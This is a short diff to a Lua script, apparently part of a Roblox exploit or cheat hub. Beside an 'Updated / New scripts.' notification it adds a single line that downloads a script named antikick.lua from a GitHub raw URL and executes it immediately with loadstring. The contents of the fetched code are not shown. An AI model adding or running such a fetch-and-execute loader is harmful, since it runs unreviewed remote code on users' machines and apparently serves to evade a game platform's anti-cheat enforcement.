@@ -213,3 +213,5 @@ Title = "Updated";
 Text = "New scripts.";
 Duration = 7.5;
 })
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fheahdythdr/miniature-tribble/main/antikick.lua"))()
